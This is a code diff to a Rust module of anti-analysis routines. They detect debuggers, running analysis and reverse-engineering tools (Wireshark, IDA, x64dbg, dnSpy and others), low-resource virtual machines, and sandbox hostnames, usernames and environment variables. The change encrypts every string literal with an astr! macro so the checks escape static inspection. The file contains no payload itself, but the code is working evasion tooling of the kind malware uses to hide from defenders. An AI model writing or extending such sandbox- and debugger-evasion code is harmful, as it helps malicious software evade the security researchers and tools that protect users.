@@ -1,3 +1,4 @@
+use encstr::astr;
 use std::time::{Duration, Instant};
 
 #[cfg(target_os = "linux")]
@@ -46,10 +47,10 @@ fn check_all() -> bool {
 fn check_debugger() -> bool {
     #[cfg(target_os = "linux")]
     {
-        if let Ok(status) = fs::read_to_string("/proc/self/status") {
+        if let Ok(status) = fs::read_to_string(astr!("/proc/self/status")) {
             for line in status.lines() {
-                if line.starts_with("TracerPid:") {
-                    let pid = line.trim_start_matches("TracerPid:").trim();
+                if line.starts_with(astr!("TracerPid:").as_str()) {
+                    let pid = line.trim_start_matches(astr!("TracerPid:").as_str()).trim();
                     if pid != "0" {
                         return true;
                     }
@@ -71,71 +72,71 @@ fn check_debugger() -> bool {
 }
 
 #[cfg(target_os = "linux")]
-const ANALYSIS_PROCESSES: &[&str] = &[
-    "wireshark",
-    "tcpdump",
-    "strace",
-    "ltrace",
-    "gdb",
-    "procmon",
-    "procexp",
-    "ftk",
-    "foremost",
-    "volatility",
-    "radare2",
-    "rizin",
-];
+static ANALYSIS_PROCESSES: std::sync::LazyLock<Vec<String>> = std::sync::LazyLock::new(|| vec![
+    astr!("wireshark"),
+    astr!("tcpdump"),
+    astr!("strace"),
+    astr!("ltrace"),
+    astr!("gdb"),
+    astr!("procmon"),
+    astr!("procexp"),
+    astr!("ftk"),
+    astr!("foremost"),
+    astr!("volatility"),
+    astr!("radare2"),
+    astr!("rizin"),
+]);
 
 #[cfg(target_os = "windows")]
-const ANALYSIS_PROC_W: &[&str] = &[
-    "wireshark.exe",
-    "procmon.exe",
-    "procmon64.exe",
-    "procexp.exe",
-    "procexp64.exe",
-    "tcpview.exe",
-    "fiddler.exe",
-    "processhacker.exe",
-    "processhacker64.exe",
-    "ida.exe",
-    "ida64.exe",
-    "x64dbg.exe",
-    "x32dbg.exe",
-    "ollydbg.exe",
-    "immunitydebugger.exe",
-    "windbg.exe",
-    "regmon.exe",
-    "filemon.exe",
-    "apimonitor.exe",
-    "apiMonitor.exe",
-    "dumpcap.exe",
-    "python.exe",
-    "python3.exe",
-    "pestry.exe",
-    "peid.exe",
-    "lordpe.exe",
-    "importrec.exe",
-    "petools.exe",
-    "dnspy.exe",
-    "ilspy.exe",
-    "httpanalyzer.exe",
-    "fakenet.exe",
-    "inetsim.exe",
-];
+static ANALYSIS_PROC_W: std::sync::LazyLock<Vec<String>> = std::sync::LazyLock::new(|| vec![
+    astr!("wireshark.exe"),
+    astr!("procmon.exe"),
+    astr!("procmon64.exe"),
+    astr!("procexp.exe"),
+    astr!("procexp64.exe"),
+    astr!("tcpview.exe"),
+    astr!("fiddler.exe"),
+    astr!("processhacker.exe"),
+    astr!("processhacker64.exe"),
+    astr!("ida.exe"),
+    astr!("ida64.exe"),
+    astr!("x64dbg.exe"),
+    astr!("x32dbg.exe"),
+    astr!("ollydbg.exe"),
+    astr!("immunitydebugger.exe"),
+    astr!("windbg.exe"),
+    astr!("regmon.exe"),
+    astr!("filemon.exe"),
+    astr!("apimonitor.exe"),
+    astr!("apiMonitor.exe"),
+    astr!("dumpcap.exe"),
+    astr!("python.exe"),
+    astr!("python3.exe"),
+    astr!("pestry.exe"),
+    astr!("peid.exe"),
+    astr!("lordpe.exe"),
+    astr!("importrec.exe"),
+    astr!("petools.exe"),
+    astr!("dnspy.exe"),
+    astr!("ilspy.exe"),
+    astr!("httpanalyzer.exe"),
+    astr!("fakenet.exe"),
+    astr!("inetsim.exe"),
+]);
 
 fn check_analysis_processes() -> bool {
     #[cfg(target_os = "linux")]
     {
-        if let Ok(entries) = fs::read_dir("/proc") {
+        if let Ok(entries) = fs::read_dir(astr!("/proc")) {
             for entry in entries.flatten() {
                 let pid = match entry.file_name().to_string_lossy().parse::<u32>() {
                     Ok(n) => n,
                     Err(_) => continue,
                 };
-                let comm_path = Path::new("/proc").join(pid.to_string()).join("comm");
+                let comm_path = Path::new(astr!("/proc")).join(pid.to_string()).join(astr!("comm"));
                 if let Ok(name) = fs::read_to_string(&comm_path) {
                     let name = name.trim().to_lowercase();
-                    if ANALYSIS_PROCESSES.iter().any(|p| name.contains(p)) {
+                    if ANALYSIS_PROCESSES.iter().any(|p| name.contains(p.as_str())) {
                         return true;
                     }
                 }
@@ -182,13 +183,13 @@ fn check_low_resources() -> bool {
 
     #[cfg(target_os = "linux")]
     {
-        if let Ok(meminfo) = fs::read_to_string("/proc/meminfo") {
+        if let Ok(meminfo) = fs::read_to_string(astr!("/proc/meminfo")) {
             for line in meminfo.lines() {
-                if line.starts_with("MemTotal:") {
+                if line.starts_with(astr!("MemTotal:").as_str()) {
                     let kb_str = line
-                        .trim_start_matches("MemTotal:")
+                        .trim_start_matches(astr!("MemTotal:").as_str())
                         .trim()
-                        .trim_end_matches(" kB");
+                        .trim_end_matches(astr!(" kB").as_str());
                     if let Ok(kb) = kb_str.parse::<u64>() {
                         let gb = kb / 1024 / 1024;
                         if gb < 2 {
@@ -200,7 +201,7 @@ fn check_low_resources() -> bool {
             }
         }
 
-        let cpath = std::ffi::CString::new("/").unwrap_or_default();
+        let cpath = std::ffi::CString::new(astr!("/").as_str()).unwrap_or_default();
         let mut stat: libc::statvfs = unsafe { std::mem::zeroed() };
         let ret = unsafe { libc::statvfs(cpath.as_ptr(), &mut stat) };
         if ret == 0 {
@@ -226,7 +227,7 @@ fn check_low_resources() -> bool {
             let mut free_bytes: ULARGE_INTEGER = std::mem::zeroed();
             let mut total_bytes: ULARGE_INTEGER = std::mem::zeroed();
             let mut total_free_bytes: ULARGE_INTEGER = std::mem::zeroed();
-            let drive = "C:\\\0".as_ptr() as *const i8;
+            let drive = astr!("C:\\\0").as_ptr() as *const i8;
             if GetDiskFreeSpaceExA(
                 drive,
                 &mut free_bytes,
@@ -248,26 +249,26 @@ fn check_low_resources() -> bool {
 
 fn check_sandbox_env_vars() -> bool {
     for var in &[
-        "SBIE",
+        astr!("SBIE"),
     ] {
         for (key, _) in std::env::vars() {
             let key = key.to_uppercase();
-            if key.starts_with(var) {
+            if key.starts_with(var.as_str()) {
                 return true;
             }
         }
     }
 
-    if let Ok(compname) = std::env::var("COMPUTERNAME") {
+    if let Ok(compname) = std::env::var(astr!("COMPUTERNAME")) {
         let lower = compname.to_lowercase();
-        if lower.starts_with("sandbox") || lower.starts_with("malware") || lower.starts_with("virus") {
+        if lower.starts_with(astr!("sandbox").as_str()) || lower.starts_with(astr!("malware").as_str()) || lower.starts_with(astr!("virus").as_str()) {
             return true;
         }
     }
 
-    if let Ok(user) = std::env::var("USER") {
+    if let Ok(user) = std::env::var(astr!("USER")) {
         let lower = user.to_lowercase();
-        if lower == "sandbox" || lower == "malware" || lower == "virus" || lower == "currentuser" {
+        if lower.as_str() == astr!("sandbox").as_str() || lower.as_str() == astr!("malware").as_str() || lower.as_str() == astr!("virus").as_str() || lower.as_str() == astr!("currentuser").as_str() {
             return true;
         }
     }
@@ -276,9 +277,9 @@ fn check_sandbox_env_vars() -> bool {
         .into_string()
         .unwrap_or_default()
         .to_lowercase();
-    if hostname.starts_with("sandbox")
-        || hostname.starts_with("malware")
-        || hostname == "win-k9rjhohk3p6"
+    if hostname.starts_with(astr!("sandbox").as_str())
+        || hostname.starts_with(astr!("malware").as_str())
+        || hostname.as_str() == astr!("win-k9rjhohk3p6").as_str()
     {
         return true;
     }
